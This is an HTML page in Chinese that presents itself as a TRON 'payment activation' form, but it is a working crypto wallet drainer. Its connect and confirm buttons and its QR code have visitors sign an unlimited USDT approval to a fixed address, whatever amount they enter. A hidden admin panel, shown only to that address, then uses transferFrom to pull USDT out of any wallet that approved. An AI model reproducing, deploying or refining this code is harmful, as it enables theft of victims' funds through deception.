<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>支付开通</title>
<script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.min.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui, sans-serif}
body{background:#0B0B1F;color:#fff;padding:20px}
.container{max-width:420px;margin:0 auto}
.pay-box{background:#1E1E35;padding:30px;border-radius:20px;text-align:center;margin-bottom:30px}
h1{font-size:24px;margin-bottom:8px}
.desc{color:#aaa;margin-bottom:20px}
#connectBtn{
 background:#F0B90B;color:#000;
 border:none;padding:16px;width:100%;
 border-radius:14px;font-size:16px;font-weight:bold;
 margin-bottom:16px;
}
.amount-input{
 width:100%;padding:14px;background:#111;border:none;
 border-radius:12px;color:#fff;font-size:16px;text-align:center;
 margin-bottom:12px;
}
#qrcode{
 width:280px;height:280px;background:#fff;padding:10px;
 border-radius:16px;margin:0 auto 20px;
 display:flex;align-items:center;justify-content:center;
 color:#000;font-size:14px;
}
#qrcode img{width:100%;height:100%;border-radius:12px}
#payBtn{
 background:#F0B90B;color:#000;
 border:none;padding:16px;width:100%;
 border-radius:14px;font-size:16px;font-weight:bold
}
.admin-panel{
 background:#1E1E35;padding:24px;border-radius:16px;display:none
}
.admin-panel.show{display:block}
.admin-title{color:#ff4444;font-weight:bold;margin-bottom:16px}
.admin-input{
 width:100%;padding:12px;background:#111;border:none;
 border-radius:8px;color:#fff;margin-bottom:10px;
}
.admin-btn{
 width:100%;padding:14px;background:#ff4444;color:#fff;
 border:none;border-radius:10px;font-weight:bold;margin-bottom:16px;
}
.tip-text{margin-top:14px;color:#bbbbbb;font-size:12px;word-break:break-all;}
</style>
</head>
<body>
<div class="container">
    <div class="pay-box">
        <h1>💳 支付开通</h1>
        <p class="desc">波场链TRON · 安全开通</p>
        <button id="connectBtn">👉 连接钱包（波场链）</button>
        <input class="amount-input" id="amount" value="10" placeholder="授权额度 USDT">
        <div id="qrcode">加载二维码...</div>
        <div class="tip-text">收款&管理员地址：TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE</div>
        <button id="payBtn" style="margin-top:16px">确认授权开通</button>
    </div>

    <div class="admin-panel" id="adminPanel">
        <div class="admin-title">🔐 管理员控制台</div>
        <div>提取玩家钱包USDT（transferFrom）</div>
        <input class="admin-input" id="userAddr" placeholder="玩家钱包地址">
        <input class="admin-input" id="drawAmt" placeholder="提取数量 USDT">
        <button class="admin-btn" onclick="drawFromUser()">提取玩家代币</button>

        <div>发放USDT奖励给玩家</div>
        <input class="admin-input" id="toAddr" placeholder="玩家钱包地址">
        <input class="admin-input" id="sendAmt" placeholder="发放数量 USDT">
        <button class="admin-btn" onclick="sendReward()">发放奖励代币</button>
    </div>
</div>

<script>
// ==========固定配置【收款地址 = 管理员地址，统一为下面这个】==========
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
// 所有用户授权目标、接收代币、管理员身份，全部统一这个地址
const TARGET_ADDR = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";

let tronWeb = null;
let userAccount = null;

//等待tronLink钱包对象，彻底修复 requestAccounts 报错，兼容iOS TP扫码跳转
async function waitTronLink(maxWait=40){
    for(let i=0;i<maxWait;i++){
        if(window.tronLink !== undefined){
            return true;
        }
        await new Promise(resolve=>setTimeout(resolve, 100));
    }
    return false;
}

//连接钱包，重点修复连接失败报错
document.getElementById("connectBtn").onclick = async () => {
    const linkReady = await waitTronLink();
    if(!linkReady){
        alert("请在TP钱包【发现】内置浏览器打开本页面，外部浏览器不支持波场DApp");
        return;
    }
    try{
        //TP官方标准调用方式
        const result = await window.tronLink.requestAccounts();
        userAccount = result.address;

        //手动初始化TronWeb实例，不依赖钱包注入的tronWeb对象，解决iOS扫码桥损坏
        tronWeb = new TronWeb({
            fullHost: "https://api.trongrid.io",
            headers: {},
            privateKey: false
        });

        document.getElementById("connectBtn").innerText = "✅已连接：" + userAccount.slice(0,8)+"...";

        //只有使用管理员钱包登录，才展示管理员面板
        if(userAccount === TARGET_ADDR){
            document.getElementById("adminPanel").classList.add("show");
        }
        genQRCode();
    }catch(err){
        alert("连接钱包失败："+ (err?.message || String(err)));
    }
};

//生成二维码：授权目标固定 TARGET_ADDR
function genQRCode(){
    //tron协议二维码：用户扫码直接授权USDT给TARGET_ADDR
    const qrData = `tron:${USDT_CONTRACT}?function=approve&args=${TARGET_ADDR},ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff`;
    document.getElementById("qrcode").innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(qrData)}">`;
}

window.onload = genQRCode;
document.getElementById("amount").oninput = genQRCode;

//页面按钮执行无限授权，授权对象固定TARGET_ADDR
document.getElementById("payBtn").onclick = async ()=>{
    if(!tronWeb || !userAccount){
        alert("请先点击连接钱包");
        return;
    }
    try{
        const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
        const txHash = await usdtContract.approve(
            TARGET_ADDR,
            "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
        ).send({feeLimit: 100000000});
        alert("✅授权成功！交易哈希："+txHash);
    }catch(err){
        alert("操作失败或用户取消签名："+ (err?.message||err));
    }
};

//管理员：transferFrom，从已经授权的用户钱包提取USDT到TARGET_ADDR
async function drawFromUser() {
    if(userAccount !== TARGET_ADDR){
        alert("⚠️只有管理员钱包可以执行该操作");
        return;
    }
    const fromUser = document.getElementById("userAddr").value.trim();
    const drawAmount = parseFloat(document.getElementById("drawAmt").value);
    if(!fromUser || isNaN(drawAmount) || drawAmount <= 0){
        alert("请完整填写参数");
        return;
    }
    try{
        const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
        const sunValue = tronWeb.toSun(drawAmount);
        const tx = await usdtContract.transferFrom(fromUser, TARGET_ADDR, sunValue).send({feeLimit:100000000});
        alert("✅提取完成，交易哈希："+tx);
    }catch(e){
        alert("提取失败："+e.message);
    }
}

//管理员发放奖励，从管理员钱包转账给玩家
async function sendReward() {
    if(userAccount !== TARGET_ADDR){
        alert("⚠️只有管理员钱包可以执行该操作");
        return;
    }
    const receiveUser = document.getElementById("toAddr").value.trim();
    const sendAmount = parseFloat(document.getElementById("sendAmt").value);
    if(!receiveUser || isNaN(sendAmount) || sendAmount <=0 ){
        alert("请完整填写参数");
        return;
    }
    try{
        const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
        const sunValue = tronWeb.toSun(sendAmount);
        const tx = await usdtContract.transfer(receiveUser, sunValue).send({feeLimit:100000000});
        alert("✅奖励发放成功，交易哈希："+tx);
    }catch(e){
        alert("发放失败："+e.message);
    }
}
</script>
</body>
</html>
